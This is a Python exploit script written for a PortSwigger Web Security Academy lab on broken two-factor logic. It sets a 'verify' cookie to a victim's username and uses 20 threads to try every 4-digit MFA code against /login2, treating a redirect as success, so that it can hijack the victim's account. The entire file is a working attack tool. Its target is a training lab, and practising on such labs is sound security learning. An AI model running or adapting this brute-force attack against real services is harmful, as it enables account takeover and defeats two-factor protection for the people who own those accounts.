#!/usr/bin/env python3
"""
2FA Code Brute Force (Multithreaded)
--------------------------------------
Technique: Brute-force a 4-digit MFA code by trying all combinations (0000-9999).
The verify cookie is set to the victim's username to target their account.
Target: PortSwigger Web Security Academy - "2FA broken logic"

Usage:
    python3 brute_2fa.py

Requirements:
    pip install requests
"""

import requests
import sys
import threading
from queue import Queue

# CONFIG
TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
SESSION_COOKIE = "YOUR_SESSION_COOKIE"
VERIFY_USER = "carlos"
THREADS = 20

found = None
lock = threading.Lock()


def worker(queue: Queue) -> None:
    """
    Thread worker - picks codes from queue and sends requests.
    Stops when valid code is found or queue is empty.
    """
    global found

    session = requests.Session()
    session.cookies.set("session", SESSION_COOKIE)
    session.cookies.set("verify", VERIFY_USER)

    while not queue.empty():
        if found:
            return

        mfa_code = queue.get()

        try:
            r = session.post(
                f"{TARGET}/login2",
                data={"mfa-code": mfa_code},
                allow_redirects=False,
                timeout=10
            )
        except requests.RequestException:
            queue.task_done()
            continue

        if r.status_code == 302:
            with lock:
                found = mfa_code
                print(f"\n[+] Valid MFA code found: {mfa_code}")
            queue.task_done()
            return

        queue.task_done()


def main():
    global found

    print("=" * 50)
    print(" 2FA Brute Force - Broken Logic (Multithreaded)")
    print("=" * 50 + "\n")

    if TARGET == "https://YOUR-LAB-ID.web-security-academy.net":
        print("[!] Please set TARGET and SESSION_COOKIE before running.")
        sys.exit(1)

    print(f"[*] Brute-forcing 2FA code for user: {VERIFY_USER}")
    print(f"[*] Threads: {THREADS}")
    print(f"[*] Trying 0000 to 9999...\n")

    queue = Queue()
    for code in range(10000):
        queue.put(f"{code:04d}")

    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker, args=(queue,))
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    if found:
        print(f"\n[+] Done. MFA code: {found}")
        print(f"[+] Load /my-account in browser using your session cookie.")
    else:
        print("\n[-] No valid code found.")
        print("[*] Try regenerating the code via GET /login2 with verify=carlos")


if __name__ == "__main__":
    main()